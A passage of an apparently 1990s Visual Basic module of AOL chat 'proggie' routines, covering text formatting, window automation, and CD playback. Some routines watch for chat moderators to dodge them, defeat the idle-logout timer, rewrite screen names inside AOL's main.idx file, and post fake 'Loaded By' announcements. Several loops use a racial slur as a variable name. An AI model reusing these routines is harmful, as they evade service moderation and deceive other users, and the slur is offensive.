        RichTB.SelItalic = False
      
      Case Else
        If Left$(t$, 10) = "font color" Then 'change font color
          ColorStart = InStr(t$, "#")
          ColorString$ = Mid$(t$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          RichTB.SelStart = StartPlace%
          RichTB.SelColor = RGB(RV, GV, BV)
        End If
        If Left$(t$, 9) = "font face" Then
            fontstart% = InStr(t$, Chr(34))
            dafont$ = Right(t$, Len(t$) - fontstart%)
            RichTB.SelStart = StartPlace%
            RichTB.SelFontName = dafont$
        End If
    End Select
  Else  'normal text
    RichTB.SelText = RichTB.SelText + c$
    StartPlace% = StartPlace% + 1
    RichTB.SelStart = StartPlace%
  End If
Next X
End Sub

Function GetRGB(ByVal CVal As Long) As COLORRGB
  GetRGB.blue = Int(CVal / 65536)
  GetRGB.green = Int((CVal - (65536 * GetRGB.blue)) / 256)
  GetRGB.red = CVal - (65536 * GetRGB.blue + 256 * GetRGB.green)
End Function
Sub FadePreview(PicB As PictureBox, ByVal FadedText As String)
'by aDRaMoLEk
FadedText$ = Replacer(FadedText$, Chr(13), "+chr13+")
OSM = PicB.ScaleMode
PicB.ScaleMode = 3
TextOffX = 0: TextOffY = 0
StartX = 2: StartY = 0
PicB.Font = "Arial": PicB.FontSize = 10
PicB.FontBold = False: PicB.FontItalic = False: PicB.FontUnderline = False: PicB.FontStrikethru = False
PicB.AutoRedraw = True: PicB.ForeColor = 0&: PicB.Cls
For X = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, X, 1)
  If c$ = "<" Then
    TagStart = X + 1
    TagEnd = InStr(X + 1, FadedText$, ">") - 1
    t$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    X = TagEnd + 1
    Select Case t$
      Case "u"
        PicB.FontUnderline = True
      Case "/u"
        PicB.FontUnderline = False
      Case "s"
        PicB.FontStrikethru = True
      Case "/s"
        PicB.FontStrikethru = False
      Case "b"    'start bold
        PicB.FontBold = True
      Case "/b"   'stop bold
        PicB.FontBold = False
      Case "i"    'start italic
        PicB.FontItalic = True
      Case "/i"   'stop italic
        PicB.FontItalic = False
      Case "sup"  'start superscript
        TextOffY = -1
      Case "/sup" 'end superscript
        TextOffY = 0
      Case "sub"  'start subscript
        TextOffY = 1
      Case "/sub" 'end subscript
        TextOffY = 0
      Case Else
        If Left$(t$, 10) = "font color" Then 'change font color
          ColorStart = InStr(t$, "#")
          ColorString$ = Mid$(t$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          PicB.ForeColor = RGB(RV, GV, BV)
        End If
        If Left$(t$, 9) = "font face" Then 'added by monk-e-god
            fontstart% = InStr(t$, Chr(34))
            dafont$ = Right(t$, Len(t$) - fontstart%)
            PicB.Font = dafont$
        End If
    End Select
  Else  'normal text
    If c$ = "+" And Mid(FadedText$, X, 7) = "+chr13+" Then ' added by monk-e-god
        StartY = StartY + 16
        TextOffX = 0
        X = X + 6
    Else
        PicB.CurrentY = StartY + TextOffY
        PicB.CurrentX = StartX + TextOffX
        PicB.Print c$
        TextOffX = TextOffX + PicB.TextWidth(c$)
    End If
  End If
Next X
PicB.ScaleMode = OSM
End Sub

Sub FadeForm(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    b1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).green
    R1 = GetRGB(Colr1).red
    b2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((b2 - b1) / 255 * intLoop) + b1), B
    Next intLoop
End Sub
Sub FormFade(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    b1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).green
    R1 = GetRGB(Colr1).red
    b2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((b2 - b1) / 255 * intLoop) + b1), B
    Next intLoop
End Sub


Sub Anti45MinTimer()
'ouwop
If FindAwin("Write Mail") Then Exit Sub
If FindAwin("Attach") Then Exit Sub
If FindAwin("Attachments") Then Exit Sub
If FindAwin("America  Online") Then Exit Sub
aotimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(aotimer%, "_AOL_Icon")
cLickiCoN (AOIcon%)
End Sub
Sub AOL4_ScrollPROFILE(sName$, txt As Control)
''''''''Ouwop
On Error Resume Next
Dim n As Integer
numb% = FindWindow("#32770", vbNullString)
prof$ = AOLGetMemberProfile4(sName$, txt)
If txt = "" Then
sendchat "•[<i>" + sName$ + "</i>] <b>h</b>az <b>n</b>o <b>P</b>rofile..."
wi1& = FindWindowEx(AolMdi, 0&, "AOL Child", "Get a Member's Profile")
wi2& = FindWindowEx(AolMdi, 0&, "AOL Child", "Member Profile")
Call AOL4_KillWin(wi1&)
Call AOL4_KillWin(wi2&)
Exit Sub
Else
wi1& = FindWindowEx(AolMdi, 0&, "AOL Child", "Get a Member's Profile")
wi2& = FindWindowEx(AolMdi, 0&, "AOL Child", "Member Profile")
Call AOL4_KillWin(wi1&)
Call AOL4_KillWin(wi2&)
sendchat "•<b>S</b>cr0lling <b>P</b>rofile <b>u</b>v <b>u</b>zer [<i>" + sName$ + "</i>]"
TimeOut (0.6)
Call MacroLABEL(txt)
End If
TimeOut (0.6)
sendchat "•<b>U</b>zer [<i>" + sName$ + "</i>] <b>P</b>rofile <b>S</b>crolled!"

End Sub

Sub MINIMIZE_CHAT()
dd$ = XAOL4_GetCurrentRoomName
chat% = FindChildByTitle(AolMdi(), dd$)
mi = ShowWindow(chat%, SW_MINIMIZE)
End Sub
Sub UnUpchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
aomodal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(aomodal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = aomodal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(AOL%, 0)
mi = ShowWindow(Upp%, SW_MAXIMIZE)
End Sub

Sub Upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
aomodal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(aomodal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = aomodal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
mi = ShowWindow(Upp%, SW_MINIMIZE)
End Sub
Sub Get_FileTransfer(tmr As Timer)
'ouwop
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = FindChildByTitle(MDI%, "File Transfer - " + FF2$)
imsendto% = FindChildByClass(IM%, "_AOL_Static")
okwinmsgmsg$ = gettext(imsendto%)
aa$ = GetWindow(imsendto%, GW_HWNDNEXT)
aa2$ = GetWindow(aa$, GW_HWNDNEXT)
aa3$ = GetWindow(aa2$, GW_HWNDNEXT)
tim$ = gettext(aa3$)

fd$ = getcaption(IM%)
lbl$ = "0"
If okwinmsgmsg$ = "" Then
tmr.Enabled = False
MsgBox "You are not Downloading Nothing now", vbCritical, "Not DLing!"
Exit Sub
Else

If InStr(fd$, "File Transfer - ") = 1 Then
fd$ = Mid$(fd$, 16, (InStr(fd$, "%") - 3))

If InStr(okwinmsgmsg$, "Now Downloading ") = 1 Then
okwinmsgmsg$ = Mid$(okwinmsgmsg$, 16)
'      ]–^v^•
'BoldSendChat BlackBlue("•^v^–[ (\/)azTa DownLoad BoT")
'timeout (0.5)
sendchat ("•^v^–[DLing: <b><Font Color=#0000ff>" + okwinmsgmsg$ + "<Font Color=#gggggg></b> × <b><Font Color=#0000ff>" + fd$ + "<Font Color=#gggggg></b> Complete]–^v^•")
TimeOut (0.5)
sendchat ("•^v^–[<b><Font Color=#0000ff>" + tim$ + "</b><Font Color=#gggggg>]–^v^•")
'BoldSendChat BlackBlue("•^v^–/" + fd$ + " Complete!")
End If
End If
End If
End Sub

Sub AOL4_KillDLadvertise()
'Ouwop
'kill download advertizement
home% = FindChildByTitle(AolMdi, "File Transfer")
DL% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(DL%, WM_CLOSE, 0, 0)
End Sub
Sub AOL4_KillcHATadvertise()
'kill ChAT advertizement
''''''Ouwop
home% = FindChildByTitle(AolMdi, XAOL4_GetCurrentRoomName)
DL% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(DL%, WM_CLOSE, 0, 0)
End Sub

Sub Open_WriTe()
''Ouwop iz da BOMB!!
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)
'dis will open da mail
cLickiCoN (AOIcon%)
End Sub

     Sub StopCD()
     Dim lRet As Long

     'Stop the playback
     lRet = mciSendString("stop cd wait", 0&, 0, 0)

     DoEvents  'Let Windows process the event

     'Close the device
     lRet = mciSendString("close cd", 0&, 0, 0)

     End Sub

Sub RemoveDuplicateNames(lst As Control)

For i = 0 To lst.listcount - 1
For nig = 0 To lst.listcount - 1

If LCase(RemoveSpace(lst.list(i))) Like LCase(RemoveSpace(lst.list(nig))) And i <> nig Then

lst.RemoveItem (nig)
End If

Next nig
Next i
End Sub
Function aFk_duPez(sn, lst As Control)
'wopper
For i = 0 To lst.listcount - 1

For nig = 0 To lst.listcount - 1
If LCase(RemoveSpace(lst.list(i))) Like LCase(RemoveSpace(lst.list(nig))) And i <> nig Then

If sn = lst.list(nig) Then aFk_duPez = 1: Exit Function


End If
Next nig

Next i

aFk_duPez = 0
End Function
Sub RemoveitemListList(lst As ListBox, lst2 As ListBox)

For i = 0 To lst.listcount - 1
For nig = 0 To lst2.listcount - 1

If LCase(lst.list(i)) Like (lst2.list(nig)) And i <> nig Then
lst.RemoveItem lst.list(i)

End If
Next nig
Next i
End Sub

  Sub PlayCD(Track$)
On Error Resume Next
     Dim lRet As Long
     Dim nCurrentTrack As Integer

     'Open the device
     lRet = mciSendString("open cdaudio alias cd wait", 0&, 0, 0)

     'Set the time format to Tracks (default is milliseconds)
     lRet = mciSendString("set cd time format tmsf", 0&, 0, 0)

     'Then to play from the beginning
     lRet = mciSendString("play cd", 0&, 0, 0)

     'Or to play from a specific track, say track 4
     nCurrentTrack = Track
     lRet = mciSendString("play cd from" & Str(nCurrentTrack), 0&, 0, 0)

     End Sub
Sub AOLSearchMemberProfiles_Location(Where$)
Call MazTa_KW("aol://4950:0000010000|location:" & Where$)
End Sub

Sub AOLSearchMemberProfiles_MemberName(Who$)
Call MazTa_KW("aol://4950:0000010000|member_name:" & Who$)
End Sub
Sub AOLSeachMemberProfiles_All(What$)
Call MazTa_KW("aol://4950:0000010000|all:" & What$ & "*")
End Sub

Sub Decompile_Protect(txt)
On Error Resume Next
fee = FreeFile
Open App.Path + "\" + txt For Binary As #fee
cat = "."
Seek #fee, 25
Put #fee, , cat
Close #1
If Err Then Exit Sub
'M sgBox App.Path + "\" + txt & " Iz Decompiled Protected, So Dont try to Tamper with this File in ANY way Or you Will Be Sorry,((( I PROMISE! ))) ~Ouwop", 64, "Decompiled Protected!"
End Sub
Function AOL_VerzioN()
'[ouwop]
'chekz for aol2/3/4/5 >=]
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    kwbox% = FindChildByClass(temp%, "Edit")
If iz50 = 1 Then AOL_VerzioN = 5: Exit Function
If kwbox% = 0 Then AOL_VerzioN = 2: Exit Function

If kwbox% <> 0& Then AOL_VerzioN = 4: Exit Function
'If izUK = 1 Then AOL_VerzioN = UK: Exit Function
If iz30 = 1 Then AOL_VerzioN = 3: Exit Function

End Function
Function iz30()
AOL% = FindWindow("AOL Frame25", vbNullString)
If AOL% = 0 Then Exit Function
Menu% = GetMenu(AOL%)
menuname$ = Space(256)
X = GetMenuString(Menu%, 0, menuname$, 256, &H400)
If fixapistring(menuname$) = "*" Then X = 1
If fixapistring(menuname$) = "&File" Then X = 0
SubMenu% = GetSubMenu(Menu%, X)
Do
    DoEvents
    menuname$ = String(255, 0)
    X = GetMenuString(SubMenu%, i, menuname$, 256, &H400)
    i = i + 1
    If InStr(fixapistring(menuname$), "&Log Manager") Then Exit Do
Loop
If InStr(fixapistring(menuname$), "&Log Manager") Then
iz30 = 1
Else
iz30 = 0
End If

End Function
Function fixapistring(sText As String) As String
'cool#2
On Error Resume Next
If InStr(sText$, Chr$(0)) <> 0 Then fixapistring = Trim(Mid$(sText$, 1, InStr(sText$, Chr$(0)) - 1))
If InStr(sText$, Chr$(0)) = 0 Then fixapistring = Trim(sText$)
End Function


Sub AOLSNReset(sn$, AOLDir$, replace$)
l0036 = Len(sn$)
Select Case l0036
Case 3
i = sn$ + "             "
Case 4
i = sn$ + "            "
Case 5
i = sn$ + "           "
Case 6
i = sn$ + "          "
Case 7
i = sn$ + "         "
Case 8
i = sn$ + "        "
Case 9
i = sn$ + "       "
Case 10
i = sn$ + "      "
Case 11
i = sn$ + "     "
Case 12
i = sn$ + "    "
Case 13
i = sn$ + "   "
Case 14
i = sn$ + "  "
Case 15
i = sn$ + " "
Case 16

i = sn$
End Select
l0036 = Len(replace$)
Select Case l0036
Case 3
replace$ = replace$ + "             "
Case 4
replace$ = replace$ + "            "
Case 5
replace$ = replace$ + "           "
Case 6
replace$ = replace$ + "          "
Case 7
replace$ = replace$ + "         "
Case 8
replace$ = replace$ + "        "
Case 9
replace$ = replace$ + "       "
Case 10
replace$ = replace$ + "      "
Case 11
replace$ = replace$ + "     "
Case 12
replace$ = replace$ + "    "
Case 13
replace$ = replace$ + "   "
Case 14
replace$ = replace$ + "  "
Case 15
replace$ = replace$ + " "
Case 16
replace$ = replace$

End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open AOLDir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open AOLDir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = replace$
ReplaceX$ = replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub


Sub AOLResetNewUser(sn As String, tru_sn As String, Pth As String)
'creates a new sn
'example : Call AOLResetNewUser("NewSN", "CurrentSN", "C:\aol30\Organize")

Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
Dim ph
'If UCase$(Trim$(sn)) = "NEWUSER" Then MsgBox ("AOL is already on new user!"): Exit Sub
On Error GoTo no_reset
'If Len(sn) < 7 Then MsgBox ("The ScreenName has to be at least 7 Characters Long"): Exit Sub
tru_sn = tru_sn + String$(Len(sn) - 7, " ")
Let ph = (Pth & "\idb\main.idx")
Open ph For Binary As #1
Screen.MousePointer = 11
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(16384, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(sn)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(sn))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(sn)
l9E68& = Len(sn)
While l9E68& < l9E6A&
m0226 = String$(16384, " ")
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(sn)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(sn))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 16384
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next
End Sub



Sub AOLGuideWatch(txt As TextBox)
Do
Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
On Error Resume Next
Call Playwav(txt)
MsgBox "A Guide haz entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub AOLNewUserReset2(oldsn, NewSN, pathh)
'Call AOLNewUserReset2("OLD SN","NEW SN","C:\aol30")
Static moocow As String * 10000
Dim Trident As Long
Dim fish As Long
Dim Tribal As Integer
Dim werd As Integer
Dim qwerty As Variant
Dim meee As Integer
On Error GoTo err0r
tru_sn = NewSN + String$(Len(oldsn) - Len(NewSN), " ")
Let paath$ = (pathh & "\idb\main.idx")
Open paath$ For Binary As #1 'Len = 50000
Trident& = 1
fish& = LOF(1)
While Trident& < fish&
moocow = String$(40000, Chr$(0))
Get #1, Trident&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
    
Put #1, Trident&, moocow
Trident& = Trident& + 40000
Wend

Seek #1, Len(oldsn)
Trident& = Len(oldsn)
While Trident& < fish&
moocow = String$(255, Chr$(0))
Get #1, Trident&, moocow
While InStr(UCase$(moocow), UCase$(oldsn)) <> 0
Mid$(moocow, InStr(UCase$(moocow), UCase$(oldsn))) = tru_sn
Wend
Put #1, Trident&, moocow
Trident& = Trident& + 11900000
Wend
Close #1
Screen.MousePointer = 0
err0r:
Screen.MousePointer = 0
Exit Sub
Resume Next

End Sub

Sub AOLCatWatch(txt As TextBox)
Do
Y% = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo lol
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
w = InStr(LCase$(namez$), LCase$("catwatch"))
X = InStr(LCase$(namez$), LCase$("catid"))
If w <> 0 Then
On Error Resume Next
Call Playwav(txt)
MsgBox "A Cat haz entered the room."
End If
If X <> 0 Then
On Error Resume Next
Call Playwav(txt)
MsgBox "A Cat haz entered the room."
End If
Next Index%
lol:
Loop
End Sub






Sub LinkME()
BoldSendChat "< a href=" & "http://www.geocities.com/SiliconValley/Byte/5358/" & ">" & "«·.¤Ouwopz Web Page IXI Realmz¤·.»" & "</a>"
End Sub
Sub Link_(Where As String)
BoldSendChat "< a href=" & Where$ & ">" & "¤(\/)azTa Progg Cchat Link" & "</a>"
End Sub


Sub List_AddAsciiStrings(LSD As ListBox)
LSD.AddItem "[`·¸]"
LSD.AddItem "[¸·´]"
LSD.AddItem "(•("
LSD.AddItem ")•)"
LSD.AddItem "(•)"
LSD.AddItem ")•("
LSD.AddItem "`·´`·´"
LSD.AddItem "¸.-~·*'˜¨¯"
LSD.AddItem "¨˜'*·~-.¸"
LSD.AddItem "¸·`¯¨˜'*·~-.¸"
LSD.AddItem "¨ '¹i|¡,¡|i¹'¨"
LSD.AddItem "¨‘¨ˆ‘°ª·--·³°ˆ‘ˆ "
LSD.AddItem "¨ˆ‘°·-.,,.-·³°¨"
LSD.AddItem "·]¦[·"
LSD.AddItem "•,¸,.·´¯`·.,¸,•"
LSD.AddItem "· .¸·´\"
LSD.AddItem "/`·¸. ·"
LSD.AddItem "··¤÷×("
LSD.AddItem ")×÷¤··"
LSD.AddItem "«··÷×)·("
LSD.AddItem ")·(×÷··»"
LSD.AddItem "(¯`·¸ ["
LSD.AddItem "]¸·´¯)"
LSD.AddItem "«·÷·¦["
LSD.AddItem "]¦·÷·»"
LSD.AddItem "•···×"
LSD.AddItem "×···•"
LSD.AddItem "(`¨˜°º²³³™º˜¨"
LSD.AddItem "˜°º™³³²º°˜¨´)"
LSD.AddItem "«÷±·´)"
LSD.AddItem "(`·±÷»"
LSD.AddItem "˜¨°ºðØ"
LSD.AddItem "Øðº°¨˜"
LSD.AddItem "¸.´)(`·•||["
LSD.AddItem "]||•·´)(` .¸"
LSD.AddItem "[`·¸][`·÷<l["
LSD.AddItem "]l>÷·´][¸·´]"
LSD.AddItem "«·÷´'°ºðØ"
LSD.AddItem "Øðº°'`÷·»"
LSD.AddItem "ðº°¨˜°ºð"
LSD.AddItem "ðº°¨˜°ºð"
LSD.AddItem "«·÷´)´)"
LSD.AddItem "(`(`÷·»"
LSD.AddItem "(`·¸_¸.·´)"
LSD.AddItem "(`·¸_¸.·´)"
LSD.AddItem "(¸.·´)"
LSD.AddItem "(¸.·´)"
LSD.AddItem "‹›í¦ì‹›"
LSD.AddItem "•÷±/)"
LSD.AddItem "(\±÷•"
LSD.AddItem "(¯`v"
LSD.AddItem "v´¯)"
LSD.AddItem "•v^÷·•"
LSD.AddItem "•·÷^v•"
LSD.AddItem "(`·~^v÷"
LSD.AddItem "÷v^~·´)"
LSD.AddItem "*·._.•÷"
LSD.AddItem "÷•._.·*"
LSD.AddItem "(¯`·._ (¯`·._"
LSD.AddItem "_.·´¯)_.·´¯)"
LSD.AddItem "(¯`·._"
LSD.AddItem "_.·´¯)"
LSD.AddItem "«­.·´¯`•"
LSD.AddItem "•´¯`·.-»"
LSD.AddItem "‹v÷"
LSD.AddItem "÷v›"
LSD.AddItem "¸.´)(`·["
LSD.AddItem "]·´)(` .¸"
LSD.AddItem "·÷±‡±"
LSD.AddItem "±‡±÷·"
LSD.AddItem "´)·(`"
LSD.AddItem "´)·(`"
LSD.AddItem "¨˜°ºð"
LSD.AddItem "ðº°˜¨"
LSD.AddItem "···¤›"
LSD.AddItem "‹¤···"
LSD.AddItem "«··•[]¤)"
LSD.AddItem "(¤[]•··»"
LSD.AddItem "···÷±¦)"
LSD.AddItem "(¦±÷···"
LSD.AddItem "•···¤»"
LSD.AddItem "«¤···•"
LSD.AddItem "–··•)"
LSD.AddItem "(•··–"
LSD.AddItem "¤···¤(•)"
LSD.AddItem "(•)¤···¤"
LSD.AddItem "···÷±|¤"
LSD.AddItem "¤|±÷···"
LSD.AddItem "()··¤"
LSD.AddItem "¤··()"
LSD.AddItem "€¨'·.,•"
LSD.AddItem "•,.·'¨€"
LSD.AddItem "¤··»"
LSD.AddItem "«··¤"
LSD.AddItem "«¤•···/"
LSD.AddItem "\···•¤»"
LSD.AddItem "‹v^•"
LSD.AddItem "•^v›"
LSD.AddItem "•`•¤"
LSD.AddItem "¤•´•"
LSD.AddItem "]•¤"
LSD.AddItem "¤•["
LSD.AddItem "`.·ìÌìÌì"
LSD.AddItem "íÍíÍí·.´"
LSD.AddItem "‹(`·"
LSD.AddItem "·´)›"
LSD.AddItem "‹Ì›"
LSD.AddItem "‹Í›"
LSD.AddItem "`x.¸"
LSD.AddItem "‹«‹¦›»›"
LSD.AddItem "‹í¡í›"
LSD.AddItem "‹íÍí›"
LSD.AddItem "‹íÏì›"
LSD.AddItem "‹íÍí›"
LSD.AddItem "‹íÍì›"
LSD.AddItem ".`·`. `"
LSD.AddItem "´ .´·´."
LSD.AddItem "‹v(·`. "
LSD.AddItem " .´·)v›"
LSD.AddItem "`·`.ÌìÌì• "
LSD.AddItem " •íÍíÍ.´·´"
LSD.AddItem "•¤•"
LSD.AddItem "¤•¤"



End Sub
Sub Fake_Progg()
If IsUserOnline = False Then MsgBox "Not online!", vbCritical, "ERROR!": Exit Sub
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...
sPrompt = "Enta Da Name of Yo Progg Dat u wanna Fake"  'Set the prompt...
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X
sName$ = InputBox$(sPrompt, IB_TITLE, , iXPos, iYPos)    'Display box, get input
If sName$ = "" Then
Else
    
    Dim ascii
    Randomize
    ascii = Int(55 * Rnd + 1)
If ascii = 1 Then a$ = "[`·¸]"
If ascii = 2 Then a$ = "[¸·´]"
If ascii = 3 Then a$ = "(•("
If ascii = 4 Then a$ = ")•)"
If ascii = 5 Then a$ = "(•)"
If ascii = 6 Then a$ = ")•("
If ascii = 7 Then a$ = "`·´`·´"
If ascii = 8 Then a$ = "¸.-~·*'˜¨¯"
If ascii = 9 Then a$ = "¨˜'*·~-.¸"
If ascii = 10 Then a$ = "¸·`¯¨˜'*·~-.¸"
If ascii = 11 Then a$ = "¨ '¹i|¡,¡|i¹'¨"
If ascii = 12 Then a$ = "¨‘¨ˆ‘°ª·"
If ascii = 13 Then a$ = ",.-·³°¨"
If ascii = 14 Then a$ = "·]¦[·"
If ascii = 15 Then a$ = "•,¸,.·´"
If ascii = 16 Then a$ = "· .¸·´\"
If ascii = 17 Then a$ = "/`·¸. ·"
If ascii = 18 Then a$ = "··¤÷×("
If ascii = 19 Then a$ = ")×÷¤··"
If ascii = 20 Then a$ = ")·(×÷··»"
If ascii = 21 Then a$ = "(¯`·¸ ["
If ascii = 22 Then a$ = "]¸·´¯)"
If ascii = 23 Then a$ = "«·÷·¦["
If ascii = 24 Then a$ = "]¦·÷·»"
If ascii = 25 Then a$ = "•···×"
If ascii = 26 Then a$ = "×···•"
If ascii = 27 Then a$ = "(`¨˜°º²"
If ascii = 28 Then a$ = "˜°º™³³)"
If ascii = 29 Then a$ = "«÷±·´)"
If ascii = 30 Then a$ = "(`·±÷»"
If ascii = 31 Then a$ = "˜¨°ºðØ"
If ascii = 32 Then a$ = "Øðº°¨˜"
If ascii = 33 Then a$ = "¸.´)(`·•||["
If ascii = 34 Then a$ = "]||•·´)(` .¸"
If ascii = 35 Then a$ = "[`·÷<l["
If ascii = 36 Then a$ = "]l>÷·´]"
If ascii = 37 Then a$ = "«·÷´'°ºðØ"
If ascii = 38 Then a$ = "Øðº°'`÷·»"
If ascii = 39 Then a$ = "˜°ºð"
If ascii = 40 Then a$ = "ðº°¨"
If ascii = 41 Then a$ = "«·÷´)´)"
If ascii = 42 Then a$ = "(`(`÷·»"
If ascii = 43 Then a$ = "(`·¸_¸.·´)"
If ascii = 44 Then a$ = "(¸.·´)"
If ascii = 45 Then a$ = "(¸.·´)"
If ascii = 46 Then a$ = "‹›í¦ì‹›"
If ascii = 47 Then a$ = "•÷±/)"
If ascii = 48 Then a$ = "(\±÷•"
If ascii = 49 Then a$ = "(¯`v"
If ascii = 50 Then a$ = "v´¯)"
If ascii = 51 Then a$ = "•v^÷·•"
If ascii = 52 Then a$ = "•·÷^v•"
If ascii = 53 Then a$ = "(`·~^v÷"
If ascii = 54 Then a$ = "÷v^~·´)"
If ascii = 55 Then a$ = "*·._.•÷"

    Dim phade
    Randomize
    phade = Int(10 * Rnd + 1)

If phade = 1 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 2 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 3 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 4 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 5 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 6 Then
sendchat R_Elite(a$ + sName$)
TimeOut (0.5)
sendchat R_Elite(a$ + "Loaded By: " + getuser)
Else
If phade = 7 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 8 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 9 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
Else
If phade = 10 Then
sendchat (a$ + sName$)
TimeOut (0.5)
sendchat (a$ + "Loaded By: " + getuser)
End If
End If
End If
End If
End If
End If
End If
End If
End If
End If
End If
End Sub

Function AOL4_MDI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOL4_MDI = FindChildByClass(AOL%, "MDIClient")
End Function
Function BeLL_MDI()
bel% = FindWindow("#32770", vbNullString)
BeLL_MDI = FindChildByClass(bel%, "MDIClient")


End Function

Sub Macro_ouwop()
